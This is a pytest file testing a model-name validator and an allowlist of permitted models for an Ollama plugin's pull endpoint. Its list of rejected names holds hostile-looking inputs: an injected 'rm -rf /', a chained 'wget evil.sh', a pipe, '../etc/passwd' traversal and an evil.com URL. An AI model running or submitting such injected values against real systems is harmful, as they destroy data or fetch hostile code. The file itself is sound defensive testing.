"""
F3.2 BUG-NB-10 — PullModelRequest validator + supply-chain allowlist.

Verifies that the Pydantic model rejects names with shell metacharacters,
path traversal, URLs, and (when the env var is set) entries outside the
operator-defined allowlist.
"""
from __future__ import annotations

import pytest
from pydantic import ValidationError


@pytest.fixture
def PullModelRequest():
    from plugins.ollama_module.api.routes import PullModelRequest as _P
    return _P


class TestFormatValidator:
    """Format regex — independent of NEXE_OLLAMA_ALLOWED_MODELS."""

    def test_clean_name_with_tag_accepted(self, PullModelRequest):
        m = PullModelRequest(name="qwen3:8b")
        assert m.name == "qwen3:8b"

    def test_clean_name_without_tag_accepted(self, PullModelRequest):
        m = PullModelRequest(name="llama3.2")
        assert m.name == "llama3.2"

    def test_registry_path_accepted(self, PullModelRequest):
        m = PullModelRequest(name="library/qwen3:8b")
        assert m.name == "library/qwen3:8b"

    @pytest.mark.parametrize("bad_name", [
        "",                              # empty
        "a" * 201,                       # over length cap
        "qwen3; rm -rf /",               # semicolon
        "qwen3 && wget evil.sh",         # whitespace + shell
        "qwen3|cat",                     # pipe
        "../etc/passwd",                 # path traversal
        "http://evil.com/model",         # URL form rejected
        "qwen3\x00",                     # NUL byte
        "qwen3\n",                       # newline injection
        "qwen3:8b:extra:colons",         # too many tag segments
        "qweñ3",                         # non-ASCII (homoglyph guard)
    ])
    def test_malformed_names_rejected(self, PullModelRequest, bad_name):
        with pytest.raises(ValidationError):
            PullModelRequest(name=bad_name)


class TestAllowlistEnforcement:
    """Allowlist via NEXE_OLLAMA_ALLOWED_MODELS — opt-in, fnmatch patterns."""

    def test_no_env_means_permissive(self, PullModelRequest, monkeypatch):
        monkeypatch.delenv("NEXE_OLLAMA_ALLOWED_MODELS", raising=False)
        # Anything that passes the format regex is OK when allowlist is absent.
        assert PullModelRequest(name="anything-goes:1b").name == "anything-goes:1b"

    def test_allowlist_accepts_match(self, PullModelRequest, monkeypatch):
        monkeypatch.setenv("NEXE_OLLAMA_ALLOWED_MODELS", "qwen3*,llama3*")
        assert PullModelRequest(name="qwen3:8b").name == "qwen3:8b"
        assert PullModelRequest(name="llama3.2:1b").name == "llama3.2:1b"

    def test_allowlist_rejects_non_match(self, PullModelRequest, monkeypatch):
        monkeypatch.setenv("NEXE_OLLAMA_ALLOWED_MODELS", "qwen3*,llama3*")
        with pytest.raises(ValidationError):
            PullModelRequest(name="mistral:7b")

    def test_allowlist_blank_string_is_permissive(self, PullModelRequest, monkeypatch):
        # Blank / whitespace-only env value behaves like unset.
        monkeypatch.setenv("NEXE_OLLAMA_ALLOWED_MODELS", "   ")
        assert PullModelRequest(name="mistral:7b").name == "mistral:7b"

    def test_allowlist_with_spaces_around_entries(self, PullModelRequest, monkeypatch):
        monkeypatch.setenv("NEXE_OLLAMA_ALLOWED_MODELS", " qwen3* ,  gemma* ")
        assert PullModelRequest(name="gemma:2b").name == "gemma:2b"
        with pytest.raises(ValidationError):
            PullModelRequest(name="phi:3b")
